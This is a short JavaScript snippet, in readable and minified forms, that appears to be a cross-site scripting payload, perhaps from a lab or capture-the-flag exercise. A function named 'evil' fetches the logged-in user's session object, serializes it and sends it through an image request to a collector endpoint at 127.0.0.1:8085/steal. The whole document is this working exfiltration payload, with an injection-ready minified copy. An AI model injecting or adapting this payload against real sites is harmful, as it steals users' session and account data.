async function evil() {
    await getAuthStatus();
    let u = Session.user;

    let str = JSON.stringify(u);

    let url = 'http://127.0.0.1:8085/steal?d='+encodeURIComponent(str);

    let img = new Image();
    img.src = url;
}

evil();


//Minified:
// async function evil(){await getAuthStatus();let e=Session.user,t=JSON.stringify(e),n="http://127.0.0.1:8085/steal?d="+encodeURIComponent(t);(new Image).src=n}evil();